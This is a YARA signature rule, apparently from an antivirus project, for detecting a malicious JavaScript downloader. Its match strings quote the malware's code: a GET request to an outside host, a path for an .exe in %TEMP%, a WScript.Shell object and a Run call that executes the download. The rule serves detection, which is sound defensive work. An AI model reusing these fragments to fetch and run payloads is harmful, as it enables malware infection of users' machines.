rule sig_20160329_f8d22e11953fee6693ec03f807e60537 {
  meta:
    description = "datamaliciousorder - file 20160329_f8d22e11953fee6693ec03f807e60537.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "93081a0ef1a72f48fc71accf8cbb3ce82c1ca0c9c19b03c01f788f75fc0122ad"

  strings:
    $s1  = "G0[B](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function Lk() {return l[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NxklInaJTIS15.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[rl](X() * 11); if (G0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function M(LW, D){hq = hq * 1; return LW - D;};" fullword ascii
    $s5  = "var l = function ze() {return WScript[zZ](\"WScript.Shell\");}(), QX = 11;" fullword ascii
    $s6  = "function y(){return \"\" + m;};" fullword ascii
    $s7  = "function bT(q){l[\"Run\"](q, hq, hq);};" fullword ascii
    $s8  = "function c() {return ((K == true) && (K == li)) ? 1 : hq;};" fullword ascii
    $s9  = "function z()" fullword ascii
    $s10 = " while (a){" fullword ascii
    $s11 = "function X(){return 22;};" fullword ascii
    $s12 = "return M(fZ, HH);" fullword ascii
    $s13 = "function SX(){return zZ;};" fullword ascii
    $s14 = "var X0 = new this[\"Date\"]();" fullword ascii
    $s15 = "function w(Ha) {var YJ = (1, 2, 3, 4, 5, Ha); return YJ;};" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var li = false;" fullword ascii
    $s19 = "li = true; " fullword ascii
    $s20 = "var HF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}